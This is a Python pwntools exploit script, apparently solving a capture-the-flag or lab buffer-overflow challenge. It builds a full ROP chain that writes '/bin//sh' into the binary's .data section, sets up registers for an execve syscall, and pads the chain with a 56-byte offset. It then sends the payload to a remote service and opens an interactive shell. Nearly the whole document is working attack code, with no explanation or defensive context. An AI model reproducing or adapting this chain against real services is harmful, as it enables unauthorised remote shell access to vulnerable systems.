"""
pattern search $rsp
[+] Searching for '6861616161616161'/'6161616161616168' with period=8
[+] Found at offset 56 (little-endian search) likely
"""

from pwn import *

context.arch = 'amd64'

p = b''

# Write "/bin//sh" into .data
p += p64(0x00000000004100f3) # pop rsi ; ret
p += p64(0x00000000006b90e0) # @ .data
p += p64(0x0000000000415714) # pop rax ; ret
p += b'/bin//sh'
p += p64(0x000000000047f4f1) # mov qword ptr [rsi], rax ; ret
# Now [.data] = "/bin//sh"

# Write NULL into .data+8
p += p64(0x00000000004100f3) # pop rsi ; ret
p += p64(0x00000000006b90e8) # @ .data + 8
p += p64(0x0000000000444c70) # xor rax, rax ; ret
p += p64(0x000000000047f4f1) # mov qword ptr [rsi], rax ; ret
# Now [.data+8] = 0x00

# Set up registers for execve
p += p64(0x0000000000400686) # pop rdi ; ret
p += p64(0x00000000006b90e0) # rdi = pointer to "/bin//sh"
p += p64(0x00000000004100f3) # pop rsi ; ret
p += p64(0x00000000006b90e8) # rsi = pointer to NULL
p += p64(0x000000000044be96) # pop rdx ; ret
p += p64(0x00000000006b90e8) # rdx = pointer to NULL
# rdi = "/bin/sh", rsi = 0, rdx = 0

# Set rax = 59 (SYS_execve)
p += p64(0x0000000000444c70) # xor rax, rax ; ret
for i in range(59):
    p += p64(0x0000000000474940) # add rax, 1 ; ret (repeat 59 times)

# Trigger syscall
p += p64(0x000000000040125c) # syscall

payload = b'A' * 56 + p

with open('payload', 'wb') as f:
    f.write(payload)

conn = remote('192.168.122.129', 10173)
print(f'[+] Sending payload: {payload}')
conn.sendafter(b':D', payload)
conn.interactive()



